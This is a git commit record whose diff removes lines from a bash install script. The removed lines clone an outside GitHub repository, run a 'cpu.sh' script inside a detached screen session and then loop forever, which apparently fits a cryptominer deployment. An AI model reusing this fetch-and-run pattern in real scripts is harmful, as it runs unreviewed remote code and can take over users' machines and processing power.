46178b24883b5edbc2dbc412848eda296f7c4ce9
tuqhjiwrk <86096391+tuqhjiwrk@users.noreply.github.com>
2021-06-18 13:23:06 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,10 +1,3 @@
 #!/bin/bash
 sudo apt update
 sudo apt install screen -y
-git clone https://github.com/bimasaputrq581/furry-octo-waddle.git && cd furry-octo-waddle
-screen -dmS ls
-chmod +x cpu.sh && ./cpu.sh
-while [ 1 ]; do
-sleep 3
-done
-sleep 999
